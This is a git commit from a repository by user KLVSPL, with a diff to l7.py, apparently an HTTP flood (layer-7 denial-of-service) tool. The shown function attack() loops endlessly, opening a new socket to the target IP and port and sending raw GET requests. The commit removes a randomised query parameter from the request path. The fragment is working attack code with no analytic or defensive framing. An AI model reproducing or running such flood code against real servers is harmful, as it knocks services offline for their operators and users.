ad317e19116131bfd4a229608c03e734f1d68895
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-05-17 13:37:31 +0800

    Update l7.py

--- l7.py
+++ l7.py
@@ -69,7 +69,7 @@ def attack():
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
